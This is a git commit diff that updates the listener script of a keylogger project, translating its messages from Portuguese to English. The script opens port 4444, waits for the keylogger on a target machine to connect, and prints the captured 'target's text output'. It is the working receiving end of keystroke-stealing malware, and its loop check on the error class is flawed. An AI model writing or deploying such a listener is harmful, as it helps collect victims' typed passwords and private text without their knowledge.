c266c1ddfc8e7f3cbd2930fb03c7647d895ca048
Rodrigo Soares Ferreira <92071020+Atreus75@users.noreply.github.com>
2025-07-23 20:34:35 -0300

    Update listener.py

--- Keyllogger/listener.py
+++ Keyllogger/listener.py
@@ -1,15 +1,16 @@
-import socket
+from socket import socket, AF_INET, SOCK_STREAM, error
 
-# Cria o socket e abre uma porta (4444) para se comunicar com o alvo
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# Opens a socket in 127.0.0.1:4444 and waits for a connection from the keyllogger
+s = socket(AF_INET, SOCK_STREAM)
 s.bind(('', 4444))
 s.listen(1)
-print('[+] Aguardando conexão...')
-c, addr = s.accept()
-print(f'[+] Conexão aceita de {addr}\n{"SAÍDA DE TEXTO DO ALVO:":^5}\n')
+print('[+] Waiting for connection...')
+connection, addr = s.accept()
+print(f'[+] Connection received from {addr[0]}:{addr[1]}')
+print('[+] Target\'s text output:')
 while True:
-    print(c.recv(1024))
-    if socket.error:
-        print('[+] Conexão encerrada! \n[+] Pressione Enter para fechar o listener.')
-        input()
-        exit()
+    print(str(connection.recv(1024))[2:-1])
+    if error:
+        s.close()
+        print('\n[+] End of the connection!')
+        break
